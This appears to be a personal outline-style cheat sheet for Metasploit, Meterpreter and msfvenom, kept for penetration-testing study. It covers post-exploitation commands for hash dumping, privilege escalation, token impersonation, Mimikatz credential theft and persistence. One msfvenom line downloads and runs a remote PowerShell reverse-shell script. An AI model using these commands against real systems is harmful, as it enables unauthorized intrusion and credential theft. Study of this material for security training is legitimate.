@@ -1,0 +1,218 @@
+Metasploit:
+==========
+Basics:
+	Important Tweaks:
+		Enable Logging:
+			Basics:
+				It logs every command from msfconsole cli in ~/Dekstop/.msf5/msfconsole.rc
+			Tweak:
+				echo "spool /root/msf_console.log" ~/Dekstop/.msf5/msfconsole.rc
+MSFConsole:(Binary)
+	Basics:
+	Usage:
+		Flags:
+			-r script_name.rc => It loads resource scripts, it increases efficency as a .rc script has values like LHOST/LPORT already present.
+		Meta-Commands:
+			Variable Control:
+				Set:
+					Basics:
+					Usage:
+						set var_name => set value of some variable
+				Unset:
+					Basics:
+					Usage:
+				Session Control:
+					Sessions:
+						Basics:
+						Usage:
+							sessions => show active sessions
+							Flags:
+								-l => list all the sessions
+								-i <id> => interact with selected session
+								-k <id> => kill the specifies session
+								-u <id> => convert "shell" session into meterpreter
+				Module-Related Commands:
+					Use:
+					Info:
+					Execute:
+					Exploit:
+						Basics:
+						Usage:
+							exploit => run the exploit in foreground
+							Flags:
+								-j => run the exploit in background(as a job)
+					ctrl + z => send the current session to background
+Metasploit Modules:
+	Basics:
+	Types:(7)
+		1. Auxiliary Modules:
+			Basics:
+			Important Modules:
+				auxiliary/scanner/portscan/tcp
+					Read Lateral Movement & Pivoting Sheet
+		2. Payload Modules:
+			Basics:
+		3. Exploit Modules:
+			Basics:
+			Important Modules:
+				exploit/multi/handler:(aka Setting up a Handler/Listener)
+					Basics:
+					Usage:
+						use exploit/multi/handler
+							set payload
+		4. Post Modules:
+			Basics:
+			Important Modules:
+				post/multi/manage/autoroute:
+					Read Lateral Movement and Pivoting Sheet
+				post/windows/manage/persistence_exe
+					Read Persistence Sheet.
+				post/multi/gather/ping_sweep
+					Read Lateral Movement & Pivoting Sheet
+				post/windows/gather/arp_scanner
+					Read Lateral Movement & Pivoting Sheet
+		5. Evasion Modules:
+			Basics:
+		6. Nops:
+			Basics:
+		7. Encoders:
+			Basics:
+Meterpreter:
+	Basics:
+	Usage:
+		Meta-Commands:
+			Core Commands:
+				exit =>
+				shell => give a cmd/bash shell
+				sysinfo => system info
+				getuid => whoami
+				getprivs => show privileges
+				getsystem => attempt privilege escalation
+				hashdump => dump SAM/Shadow hashes
+				getpid => show current PID
+				PS:
+					Basics:
+					Usage:
+						ps => show processes
+						ps -A x86_64 -s => Show only x86_64 system prcocesses
+						Flags:
+							-A <arch> => Filter processes by given arch
+							-s => Show only System processes
+				Search:
+					Basics:
+					Usage:
+						Flags:
+							-d => Directory
+							-f => File
+				Upload:
+					Basics:
+					Usage:
+						upload path/filename
+				Download:
+					Basics:
+					Usage:
+						download path/filename
+				Execute:
+					Basics:
+						To execute a program
+					Usage:
+						Flags:
+							-H => hide process
+							-i => interact with process once created
+							-c => channels the I/O
+							-m => execute from memory
+							-d => dummy executable
+							-f => filename(malc payload)
+							-a => arguments to pass for executable
+			Sniffing:
+				sniffer:
+			Process Migration:
+				Migrate:
+					Basics:
+						Migrate command is same as post/windows/manage/migrate
+					Usage:
+						migrate <pid> => to change PID
+				Note:
+					If we change our PID to PID of a process running under the name of more privileged user, it increases the privileges available to us
+				Note:
+					If we change PID to a PID running a different arch(32 or 64), our shell arch changes too.
+			Pivoting:
+				Route:
+					Basics:
+					Usage:
+						route print => shows MSF's routing table
+				Portfwd:
+					Read Lateral Movement and Pivoting Sheet
+		Meterpreter Extensions:
+			Basics:
+				They provide extra functionality to meterpreter shell
+			Usage:
+				load <extension_name> => to load the specified extension
+				help <extension_name> => to see options avilable for the specified extension
+			Important Extensions:
+				Incognito:(load incognito)
+					Basics:
+						It allows to impersonate user tokens
+					Meta-Commands:
+						List_Tokens:
+							Basics:
+							Usage:
+								list_tokens -u
+								Flags:
+									-u => 
+						impersonate_token "token_name"
+				Powershell:(load powershell)
+					Basics:
+					Usage:
+				Mimikatz:
+					Basics:	
+						Its Mimikatz version 1.x
+					Usage:				
+				Kiwi:
+					Basics:
+						Its Mimikatz version 2.x
+					Usage:
+						creds_kerberos => give creds from kerberos tickets
+		Meterpreter Scripts:
+			Basics:
+				Note:
+					Meterpreter scripts are deprecated but can be still used
+					Try post/ Modules instead
+			Usage:
+				run <script_name>
+			Important Scripts:
+				Persistence:
+					Note:
+						Instead use post/windows/manage/persistence_exe
+				Netenum:
+					Read Lateral Movement & Pivoting Sheet
+MSFVenom:
+	Basics:
+	Usage:
+		Note:
+			Read "redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/"
+		Sometimes we need to make payloads for BOF, it means we need to get our payload under a limited set of bytes, but with most payloads bytes are more than 1k, so:
+			-p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadstring('http://ip/Invoke-PowershellTcp.ps1')\" "
+		Flags:
+			-p => payload 
+			-f => ouput format
+			-a => architecture(x64|x86)
+			-o => output file
+			-e => encoder
+			-i => The number of times to encode the payload
+			--platform => cisco/osx/freebsd/python/windows
+			-b => bad characters
+			--list x => where x= payloads/encoders/........
+			-v => variable name (see in "tyes of formats")
+			-n => NOPs
+			-x or –template => it is used to an executable as a template when creating Payload.
+			-k, or –keep => preserve the template’s normal behaviour
+Note:
+	Issues with shell:
+		shell is created but it dies:
+			maybe port is getting blocked by firewall
+			maybe we need to use change our payload ( staged to unstaged and vice-versa)
+			change payload to generic/shell_reverse_tcp
+		exploit run, no session created:
+		Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied:
+			we need to migrate
